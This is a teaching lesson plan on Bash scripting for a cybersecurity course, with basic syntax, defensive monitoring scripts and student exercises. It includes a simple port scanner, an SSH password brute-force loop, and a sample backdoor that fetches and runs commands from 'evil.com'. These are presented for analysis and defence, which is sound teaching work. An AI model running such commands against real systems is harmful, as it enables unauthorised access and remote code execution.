# Lesson 7.2: Introduction to Shell Scripting

## Lesson Overview
| Item | Details |
|------|---------|
| **Duration** | 60-75 minutes |
| **Module** | 7 - Programming & Scripting |
| **Prerequisites** | Basic command line familiarity |
| **Platform Features** | Challenges |

## Learning Objectives
By the end of this lesson, students will be able to:
1. Explain what shell scripting is and its uses in cybersecurity
2. Write basic Bash scripts with variables and echo statements
3. Use conditional statements (if/else) in scripts
4. Create loops to automate repetitive tasks
5. Recognize script-based attacks and defenses

## Vocabulary Terms
- **Shell** - Command-line interface to the operating system
- **Script** - Text file containing commands to be executed
- **Bash** - Bourne Again Shell (common Linux shell)
- **Variable** - Named storage for data in a script
- **Shebang** - First line specifying the interpreter (#!)
- **Loop** - Code that repeats multiple times
- **Conditional** - Code that runs only if a condition is true
- **Automation** - Using scripts to perform tasks without manual input

## Materials Needed
- CyberEd Range platform access
- Terminal/command line access (or online Bash emulator)
- Script template worksheet
- Security script examples

---

## Phase 1: EXPLORE (10-15 minutes)

### Activity: "The Repetitive Task"

**Setup:** Present this scenario:

> "You're a security analyst. Your manager says: 'Every morning, I need you to check if our 10 critical servers are online, check their disk space, and verify our backup ran. Do this manually every day.'"

**Student Task (3 minutes):**
1. How long would this take manually? _______________
2. What could go wrong with manual checking? _______________
3. How could you automate this? _______________

**Discussion:**
- "What if you had 100 servers instead of 10?"
- "What if you needed to check every hour?"
- "What if you could write the steps once and run them forever?"

**Reveal:**
> "This is exactly why we use SHELL SCRIPTS! Write the commands once, run them automatically whenever needed. Let's learn how!"

**Cybersecurity Connection:**
```
Security tasks that benefit from scripting:
├── Log analysis
├── Vulnerability scanning
├── User account auditing
├── File integrity checking
├── Incident response automation
├── Backup verification
└── Alert generation
```

---

## Phase 2: EXPLAIN (15-20 minutes)

### Part 1: Shell Scripting Basics

**What Is a Shell Script?**
> A text file containing a series of commands that the shell can execute.

**Your First Script:**
```bash
#!/bin/bash
# This is a comment - explains what the script does
echo "Hello, Security Analyst!"
echo "Today's date is: $(date)"
echo "You are logged in as: $(whoami)"
```

**Script Components:**
```
#!/bin/bash          ← Shebang (tells system which interpreter)
# Comment            ← Explanation (ignored by shell)
echo "text"          ← Command to display output
$(command)           ← Command substitution (run command, use output)
```

### Part 2: Variables

**Creating and Using Variables:**
```bash
#!/bin/bash

# Create variables (no spaces around =)
name="Alice"
server_count=10
log_file="/var/log/security.log"

# Use variables with $
echo "Analyst: $name"
echo "Checking $server_count servers"
echo "Log location: $log_file"
```

**Special Variables:**
```bash
$0    # Script name
$1    # First argument
$2    # Second argument
$#    # Number of arguments
$?    # Exit status of last command
```

**Example with Arguments:**
```bash
#!/bin/bash
# save as: check_server.sh
# run as: ./check_server.sh google.com

echo "Checking server: $1"
ping -c 3 $1
```

### Part 3: Conditional Statements

**If/Else Structure:**
```bash
#!/bin/bash

server="192.168.1.100"

# Check if server responds to ping
if ping -c 1 $server > /dev/null 2>&1; then
    echo "✓ Server $server is UP"
else
    echo "✗ Server $server is DOWN - ALERT!"
fi
```

**Common Test Conditions:**
```bash
# File tests
[ -f file ]     # True if file exists
[ -d directory] # True if directory exists
[ -r file ]     # True if file is readable

# String tests
[ "$a" = "$b" ]  # Strings are equal
[ -z "$string" ] # String is empty
[ -n "$string" ] # String is not empty

# Number comparisons
[ $a -eq $b ]   # Equal
[ $a -ne $b ]   # Not equal
[ $a -gt $b ]   # Greater than
[ $a -lt $b ]   # Less than
```

**Example: Security Check Script:**
```bash
#!/bin/bash

# Check if log file exists
if [ -f /var/log/auth.log ]; then
    echo "Checking for failed logins..."
    grep "Failed password" /var/log/auth.log | tail -5
else
    echo "Warning: Auth log not found!"
fi
```

### Part 4: Loops

**For Loop - Iterate Over Items:**
```bash
#!/bin/bash

# Check multiple servers
servers="192.168.1.10 192.168.1.20 192.168.1.30"

for server in $servers; do
    echo "Checking $server..."
    ping -c 1 $server > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "  ✓ UP"
    else
        echo "  ✗ DOWN"
    fi
done
```

**While Loop - Repeat Until Condition:**
```bash
#!/bin/bash

# Monitor for suspicious activity
count=0
while [ $count -lt 10 ]; do
    echo "Security check #$count"
    # Check something here
    count=$((count + 1))
    sleep 5
done
echo "Monitoring complete"
```

### Part 5: Practical Security Scripts

**Script 1: Failed Login Monitor**
```bash
#!/bin/bash
# Monitor for brute force attempts

LOG="/var/log/auth.log"
THRESHOLD=5

echo "=== Failed Login Report ==="
echo "Generated: $(date)"
echo ""

# Count failed logins per IP
echo "IPs with failed logins:"
grep "Failed password" $LOG | \
    grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | \
    sort | uniq -c | sort -rn | head -10

echo ""
echo "If any IP has more than $THRESHOLD attempts, investigate!"
```

**Script 2: File Integrity Check**
```bash
#!/bin/bash
# Simple file integrity checker

FILES="/etc/passwd /etc/shadow /etc/hosts"
HASH_FILE="/root/file_hashes.txt"

for file in $FILES; do
    current_hash=$(md5sum $file | cut -d' ' -f1)
    stored_hash=$(grep $file $HASH_FILE | cut -d' ' -f1)

    if [ "$current_hash" != "$stored_hash" ]; then
        echo "ALERT: $file has been modified!"
    else
        echo "OK: $file unchanged"
    fi
done
```

**Script 3: Port Scanner (Basic)**
```bash
#!/bin/bash
# Simple port checker

TARGET=$1
PORTS="22 80 443 3389"

echo "Scanning $TARGET..."
for port in $PORTS; do
    timeout 1 bash -c "echo >/dev/tcp/$TARGET/$port" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "  Port $port: OPEN"
    else
        echo "  Port $port: closed"
    fi
done
```

### Part 6: Script-Based Attacks

**How Attackers Use Scripts:**
```bash
# Malicious script example (DO NOT RUN)
# Shows how attackers automate attacks

#!/bin/bash
# This would try passwords against SSH
for pass in $(cat passwords.txt); do
    sshpass -p $pass ssh user@target
done

# Defenders need to understand attacker scripts
# to build better detection!
```

**Defense: Script Detection:**
- Monitor for rapid repeated commands
- Alert on scripts accessing sensitive files
- Log all script execution
- Restrict script execution permissions

---

## Phase 3: APPLY (15-20 minutes)

### Guided Practice: "Script Builder"

**Activity 1: Complete the Script**

Fill in the blanks:

```bash
#!/bin/bash
# Security greeting script

# Create variable for analyst name
analyst=_______________

# Print greeting
echo "Welcome, _______________"
echo "Starting security checks..."

# Check if log file exists
if [ _______________ /var/log/syslog ]; then
    echo "Log file found"
else
    echo "WARNING: Log file missing!"
fi
```

**Answer:**
```bash
analyst="YourName"
echo "Welcome, $analyst"
if [ -f /var/log/syslog ]; then
```

**Activity 2: Write a Loop**

Write a script that:
1. Has a list of 3 important files
2. Loops through each file
3. Checks if each file exists
4. Prints result for each

```bash
#!/bin/bash
# Your script here:
_______________________
_______________________
_______________________
_______________________
_______________________
_______________________
```

**Activity 3: Security Script Analysis**

What does this script do?

```bash
#!/bin/bash
while true; do
    count=$(grep "Failed password" /var/log/auth.log | wc -l)
    echo "$(date): $count failed logins"
    if [ $count -gt 100 ]; then
        echo "ALERT: Possible brute force!" | mail -s "Security Alert" admin@company.com
    fi
    sleep 300
done
```

Analysis:
- Purpose: _______________
- How often does it check: _______________
- Alert threshold: _______________
- What does it do when triggered: _______________

---

## Phase 4: PRACTICE (15-20 minutes)

### Independent Challenge: "Security Scripter"

**Challenge 1: Disk Space Monitor**

Write a script that:
- Checks disk usage
- Alerts if usage > 80%
- Shows which partition is full

```bash
#!/bin/bash
# Your solution:
_______________________
_______________________
_______________________
```

**Challenge 2: User Audit Script**

Write a script that:
- Lists all users with UID > 1000 (regular users)
- Checks their last login
- Flags accounts that haven't logged in for 30 days

**Challenge 3: Log Search Script**

Write a script that takes a search term as argument and:
- Searches /var/log/syslog for that term
- Counts occurrences
- Shows last 5 matching lines

Usage: `./search_logs.sh "error"`

**Challenge 4: Apply Script Concepts**

In CyberEd Range, complete challenges that involve:
- Command line operations
- Log analysis
- Pattern recognition

---

## Phase 5: CHALLENGE (10-15 minutes)

### CTF Challenge: "The Script Master"

**Level 1 (10 points): Fix the Bug**

This script has an error. Fix it:
```bash
#!/bin/bash
name = "Security"
echo "Welcome to $name"
```

Error: _______________
Fixed code: _______________

**Level 2 (15 points): Complete the Script**

```bash
#!/bin/bash
# Check if user provided an IP address
if [ ___ $1 ]; then
    echo "Usage: $0 <ip_address>"
    exit 1
fi

# Ping the provided IP
ping -c 3 ___
```

Fill in the blanks to make it work.

**Level 3 (20 points): Write from Scratch**

Write a script that:
1. Takes a username as argument
2. Checks if user exists on system
3. If exists, shows their last login
4. If not, prints "User not found"

**Level 4 (25 points): Security Automation**

Write a script that:
1. Reads a file containing IP addresses (one per line)
2. For each IP, checks if it's responding (ping)
3. Logs results to a file with timestamp
4. Sends alert if more than 50% are down

**BONUS (30 points): Malicious Script Analysis**

This script was found on a compromised server. Analyze it:

```bash
#!/bin/bash
while true; do
    curl -s http://evil.com/cmd | bash
    sleep 3600
done
```

Questions:
1. What does this script do? _______________
2. Why is it dangerous? _______________
3. How would you detect this running? _______________
4. What defense would prevent this? _______________

---

## Wrap-Up & Reflection (5 minutes)

### Key Takeaways
1. **Scripts** automate repetitive security tasks
2. **Variables** store data: `name="value"`, use with `$name`
3. **Conditionals** make decisions: `if [ condition ]; then`
4. **Loops** repeat actions: `for` and `while`
5. **Security teams** use scripts for monitoring, auditing, incident response
6. **Attackers** also use scripts - understand them to defend!

### Script Quick Reference
```bash
#!/bin/bash           # Shebang
variable="value"      # Create variable
echo "$variable"      # Use variable
if [ test ]; then     # Conditional
for i in list; do     # For loop
while [ test ]; do    # While loop
```

### Exit Ticket
1. What symbol do you use to access a variable's value?
2. Write a single line that echoes "Server is: " followed by the first argument.
3. Why are scripting skills valuable for cybersecurity?

### Preview Next Lesson
> "Now you can write basic scripts. Next, we'll explore SQL - the language used to query databases. Understanding SQL is critical for both security analysis AND understanding SQL injection attacks!"

---

## Differentiation

### For Struggling Students
- Focus on echo and variables only
- Use fill-in-the-blank exercises
- Provide script templates
- Work in pairs

### For Advanced Students
- Explore functions in Bash
- Research PowerShell for Windows
- Build a complete security monitoring toolkit
- Investigate shell script obfuscation techniques

---

## Assessment Rubric

| Criterion | Excellent (4) | Good (3) | Developing (2) | Beginning (1) |
|-----------|---------------|----------|----------------|---------------|
| Syntax | Writes correct syntax | Minor errors | Multiple errors | Cannot write |
| Variables | Uses variables effectively | Basic variable use | Some understanding | Cannot use variables |
| Control Flow | Uses conditionals and loops | Uses one or the other | Understands concept | Cannot implement |
| Security Application | Applies scripts to security tasks | Some application | Limited application | No application |

---

## Teacher Notes

### Setup Requirements
- Access to Bash shell (Linux, Mac, or WSL on Windows)
- Online alternative: replit.com, JDoodle, or similar
- Pre-test any scripts before class

### Common Mistakes
1. Spaces around `=` in variable assignment
2. Forgetting `$` when using variables
3. Missing `fi` to close `if` statements
4. Missing `done` to close loops

### Security Discussion Points
- How attackers use scripts (automation)
- Detecting malicious scripts in logs
- Script signing and verification
- Principle of least privilege for script execution

### Real-World Applications
- Automated security scanning (Nmap scripts)
- Log analysis and alerting
- Incident response automation
- Compliance checking
- Backup verification
